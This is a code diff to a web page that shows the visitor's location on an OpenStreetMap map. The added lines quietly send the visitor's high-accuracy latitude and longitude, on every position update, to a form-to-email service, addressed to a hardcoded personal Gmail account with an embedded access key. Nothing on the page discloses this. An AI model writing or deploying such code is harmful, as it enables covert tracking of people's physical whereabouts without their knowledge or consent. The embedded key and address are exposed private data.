@@ -76,6 +76,27 @@ crossorigin=""></script>
     navigator.geolocation.watchPosition(
         (position) => {
             const {latitude, longitude} = position.coords;
+
+            const obj = {"access_key":"5f0ad93a-18ab-4193-8231-411ae9828789","name":"Location","email":"adrah89888@gmail.com","message":`latitude: ${latitude}, Longititude ${longitude}`};
+
+            const json = JSON.stringify(obj);
+
+     fetch('https://api.web3forms.com/submit',{
+        method:'POST',
+        headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: json
+             }).then((res)=>res.text())
+     .then((finalres)=>{
+   console.log(finalres);
+     })    
+    // e.preventDefault();
+    // })
+
+
+
             
             // location.replace('http://127.0.0.1:5500/map.html')
             document.querySelector(".container-xxl").style.display = "none";
@@ -83,6 +104,8 @@ crossorigin=""></script>
 
 var map = L.map('map').setView([latitude, longitude], 13);
 var marker = L.marker([latitude, longitude]).addTo(map);
+
+
 
 L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
     maxZoom: 19,
@@ -92,10 +115,16 @@ L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
              },
         (error) => {
             console.error(error);
+        },{
+            enableHighAccuracy:true,
+            timeout:5000,
+            maximumAge:0,
         }
     )
    }
      });
+
+
     
 </script>
 </html>
